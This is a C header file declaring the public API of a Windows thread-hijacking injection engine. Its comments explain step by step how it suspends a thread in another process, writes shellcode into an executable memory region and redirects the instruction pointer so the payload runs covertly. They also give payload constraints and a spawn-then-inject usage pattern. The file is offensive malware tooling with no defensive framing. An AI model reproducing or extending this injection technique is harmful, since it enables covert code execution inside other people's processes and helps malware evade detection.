/*
 * hijack.h — Thread Context Hijack Engine — Public API
 * execution_engine/thread_hijacker/hijack.h
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Include this header in any translation unit that calls into hijack.c.
 * Link with -lkernel32.
 */

#pragma once
#include <windows.h>

/*
 * JOCKY_hijack_thread
 * ====================
 * Injects and executes payload_bytes in target_pid by hijacking an
 * existing thread. No new thread is created; uses only:
 *   CreateToolhelp32Snapshot / Thread32First / Thread32Next
 *   OpenThread / SuspendThread / GetThreadContext / SetThreadContext / ResumeThread
 *   VirtualAllocEx / WriteProcessMemory / VirtualFreeEx
 *
 * Execution model:
 *   1. Enumerate threads belonging to target_pid via snapshot
 *   2. Suspend the first thread found
 *   3. Save full CONTEXT (all GPRs + RIP + RSP + flags)
 *   4. Allocate RWX region: [payload | restore_stub]
 *   5. Patch stub with payload VA and original RIP; write both
 *   6. Redirect RIP to stub; fix RSP alignment if needed
 *   7. Resume thread; stub calls payload, restores all GPRs, JMPs to orig_rip
 *   8. Thread continues at original RIP as if nothing happened
 *
 * CAUTION: Race-prone when target_pid was just spawned.
 *   CreateToolhelp32Snapshot may complete before the process registers
 *   any threads, returning ERROR_NOT_FOUND (1168).
 *   Use JOCKY_hijack_thread_by_tid() with pi.dwThreadId instead.
 *
 * Parameters:
 *   target_pid    — PID of the target process (must already be running)
 *   payload_bytes — position-independent shellcode
 *   payload_size  — byte count of payload
 *
 * Payload constraints:
 *   - Must be position-independent (no absolute addresses)
 *   - Must end with RET (0xC3)
 *   - Must not corrupt RSP beyond its own frame
 *   - Shadow space (0x28 bytes) is pre-allocated by the stub
 *
 * Returns TRUE on success, FALSE on failure (call GetLastError for detail).
 */
BOOL JOCKY_hijack_thread(
    DWORD  target_pid,
    LPBYTE payload_bytes,
    DWORD  payload_size
);

/*
 * JOCKY_hijack_thread_by_tid
 * ===========================
 * Identical to JOCKY_hijack_thread but the caller supplies target_tid
 * directly, skipping CreateToolhelp32Snapshot entirely.
 *
 * Preferred when injecting into a freshly-spawned process:
 *   PROCESS_INFORMATION pi;
 *   CreateProcessW(..., &pi);
 *   Sleep(100);  // let loader finish
 *   JOCKY_hijack_thread_by_tid(pi.dwProcessId, pi.dwThreadId, payload, size);
 *
 * Parameters:
 *   target_pid    — PID of the target process
 *   target_tid    — TID of the thread to hijack (e.g. pi.dwThreadId)
 *   payload_bytes — position-independent shellcode (same constraints as above)
 *   payload_size  — byte count of payload
 *
 * Returns TRUE on success, FALSE on failure (call GetLastError for detail).
 */
BOOL JOCKY_hijack_thread_by_tid(
    DWORD  target_pid,
    DWORD  target_tid,
    LPBYTE payload_bytes,
    DWORD  payload_size
);